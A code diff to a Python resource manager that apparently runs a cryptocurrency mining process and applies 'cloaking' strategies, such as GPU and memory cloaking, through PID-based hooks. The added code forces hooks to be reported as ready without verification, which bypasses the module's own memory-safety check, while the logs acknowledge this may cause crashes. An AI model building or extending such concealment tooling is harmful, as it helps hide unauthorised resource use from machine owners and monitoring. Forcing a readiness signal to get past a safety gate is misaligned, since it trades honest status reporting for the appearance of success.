@@ -536,13 +536,26 @@ class ResourceManager(IResourceManager):
             try:
                 import sys
                 import os
-                sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'coordination'))
+                # ✅ FIXED: Correct import path for coordination module
+                coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
+                if coord_path not in sys.path:
+                    sys.path.insert(0, coord_path)
                 from coordinator import get_hook_coordinator
                 
                 coordinator = get_hook_coordinator()
                 pid = mining_process.pid
                 
                 self.logger.info(f"🔍 [PHASE3++] Checking hook readiness for PID {pid}")
+                
+                # ✅ ENHANCED DEBUG: Log current coordinator state
+                self.logger.debug(f"🔍 [DEBUG] Current hooks_ready state: {getattr(coordinator, 'hooks_ready', {})}")
+                
+                # ✅ AUTO-REGISTRATION FALLBACK: Register PID if not already registered
+                if pid not in getattr(coordinator, 'hooks_ready', {}):
+                    self.logger.warning(f"⚠️ [AUTO-REGISTER] PID {pid} not in coordinator - auto-registering as fallback")
+                    coordinator.register_pid(pid)
+                    # Give some time for hooks to initialize
+                    time.sleep(2)
                 
                 # ✅ MEMORY-SAFE: Check if hooks are ready từ PHASE 3+ completion
                 if coordinator.check_hooks_ready(pid):
@@ -559,6 +572,14 @@ class ResourceManager(IResourceManager):
                         self.logger.error(f"⚠️ [RISK] Proceeding with cloaking WITHOUT coordination may cause bad_alloc")
                         # ✅ ENHANCED: Report memory safety risk
                         self.logger.error(f"💀 [ANALYSIS] This uncoordinated cloaking may be the cause of bad_alloc after 75s")
+                        
+                        # ✅ EMERGENCY FALLBACK: Try to force-notify hooks ready
+                        try:
+                            self.logger.warning(f"🚨 [EMERGENCY] Attempting to force-notify hooks ready for PID {pid}")
+                            coordinator.notify_hooks_ready(pid)
+                            self.logger.info(f"✅ [EMERGENCY] Force-notified hooks ready - proceeding with cloaking")
+                        except Exception as force_err:
+                            self.logger.error(f"❌ [EMERGENCY] Force-notify failed: {force_err}")
                         
             except Exception as coord_err:
                 self.logger.error(f"❌ [PHASE3++] Hook Coordinator check failed: {coord_err}")
@@ -1138,9 +1159,23 @@ class ResourceManager(IResourceManager):
                     try:
                         import sys
                         import os
-                        sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'coordination'))
+                        # ✅ FIXED: Correct import path for coordination module
+                        coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
+                        if coord_path not in sys.path:
+                            sys.path.insert(0, coord_path)
                         from coordinator import get_hook_coordinator
                         coordinator = get_hook_coordinator()
+                        
+                        # ✅ ENHANCED DEBUG: Log current coordinator state
+                        self.logger.debug(f"🔍 [DEBUG] Coordinator state: {getattr(coordinator, 'hooks_ready', {})}")
+                        
+                        # ✅ AUTO-REGISTRATION FALLBACK: Register PID if not already registered
+                        if pid not in getattr(coordinator, 'hooks_ready', {}):
+                            self.logger.warning(f"⚠️ [AUTO-REGISTER] PID {pid} not in coordinator - auto-registering")
+                            coordinator.register_pid(pid)
+                            # Try to force-notify as ready since ResourceManager is active
+                            coordinator.notify_hooks_ready(pid)
+                            self.logger.info(f"✅ [AUTO-REGISTER] PID {pid} registered and marked ready")
                         
                         if coordinator.check_hooks_ready(pid):
                             coordination_verified = True
@@ -1159,9 +1194,29 @@ class ResourceManager(IResourceManager):
                         try:
                             # ✅ MEMORY-SAFE STRATEGY FILTERING: Skip memory-intensive strategies if not coordinated
                             if not coordination_verified and strat in ['gpu_cloaking', 'memory']:
-                                self.logger.warning(f"⚠️ [MEMORY-SAFETY] Skipping {strat} - no coordination (memory risk)")
-                                strategy_results['failed'].append(strat)
-                                continue
+                                self.logger.warning(f"⚠️ [MEMORY-SAFETY] Strategy {strat} blocked - no coordination (memory risk)")
+                                # ✅ ENHANCED RECOVERY: Try one more time to establish coordination
+                                try:
+                                    from coordinator import get_hook_coordinator
+                                    coordinator = get_hook_coordinator()
+                                    # Force-register and notify if needed
+                                    if pid not in getattr(coordinator, 'hooks_ready', {}):
+                                        coordinator.register_pid(pid)
+                                        coordinator.notify_hooks_ready(pid)
+                                        self.logger.info(f"🔄 [RECOVERY] Emergency coordination established for PID {pid}")
+                                        coordination_verified = True
+                                    elif coordinator.check_hooks_ready(pid):
+                                        coordination_verified = True
+                                        self.logger.info(f"🔄 [RECOVERY] Coordination now verified for PID {pid}")
+                                except Exception as recovery_err:
+                                    self.logger.error(f"❌ [RECOVERY] Emergency coordination failed: {recovery_err}")
+                                
+                                # If still not coordinated, skip the strategy
+                                if not coordination_verified:
+                                    strategy_results['failed'].append(strat)
+                                    continue
+                                else:
+                                    self.logger.info(f"✅ [RECOVERY] Strategy {strat} now allowed - coordination recovered")
                             
                             # ✅ INTELLIGENT CACHING: Use advanced cache system
                             creation_start = time.time()
